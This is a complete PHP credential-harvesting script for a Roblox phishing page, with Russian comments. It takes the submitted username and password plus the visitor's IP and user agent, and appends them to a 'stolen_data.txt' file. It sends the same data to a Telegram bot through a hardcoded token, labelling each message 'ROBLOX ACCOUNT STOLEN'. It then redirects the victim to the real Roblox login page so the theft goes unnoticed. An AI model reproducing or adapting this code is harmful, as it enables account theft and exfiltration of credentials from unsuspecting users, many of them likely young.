<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $date = date('Y-m-d H:i:s');
    
    // Формируем сообщение
    $message = "🔐 *ROBLOX ACCOUNT STOLEN*\n\n";
    $message .= "📅 *Date:* $date\n";
    $message .= "🌐 *IP:* $ip\n";
    $message .= "👤 *Username:* `$username`\n";
    $message .= "🔑 *Password:* `$password`\n";
    $message .= "🖥️ *User Agent:* $user_agent\n\n";
    $message .= "⚠️ _Automatic delivery via NetErrror System_";
    
    // Сохраняем в файл
    $file_data = "=== ROBLOX ACCOUNT DATA ===\n";
    $file_data .= "Date: $date\n";
    $file_data .= "IP: $ip\n";
    $file_data .= "User Agent: $user_agent\n";
    $file_data .= "Username: $username\n";
    $file_data .= "Password: $password\n";
    $file_data .= "===========================\n\n";
    
    file_put_contents('stolen_data.txt', $file_data, FILE_APPEND);
    
    // Отправляем в Telegram
    $botToken = '8110179122:AAHjbgAglX75ElcuKCcKwRwwXYGCvwY4_xM';
    $chatId = 'na1kota'; // Твой username без @
    
    $telegram_url = "https://api.telegram.org/bot$botToken/sendMessage";
    
    $post_data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];
    
    // Отправка через cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegram_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    
    // Перенаправляем на официальный сайт
    header('Location: https://www.roblox.com/login');
    exit();
}
?>
